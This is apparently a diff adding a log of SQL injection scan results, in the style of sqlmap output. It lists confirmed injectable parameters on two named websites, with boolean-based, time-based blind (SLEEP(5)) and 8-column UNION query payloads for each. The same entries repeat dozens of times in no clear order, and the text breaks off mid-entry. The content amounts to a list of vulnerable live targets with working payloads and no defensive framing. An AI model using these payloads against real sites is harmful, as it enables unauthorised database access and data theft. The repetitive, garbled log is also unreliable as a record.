+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: idnow=4 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162716271,0x4e4a474f454141426964765579775144786768675a676563445947416c4f52416d5a4667696e474a,0x71627a6271),NULL,NULL,NULL,NULL-- HeEJ
+
+
+------------------------------------------http://www.runtry.com/list.php?id=140
+Payload: id=140 AND 2848=2848
+
+
+------------------------------------------http://www.microtek.com.cn/happystudy/happystudy_info.php?idnow=4
+Payload: idnow=4 AND 9354=9354
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idnow=4 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
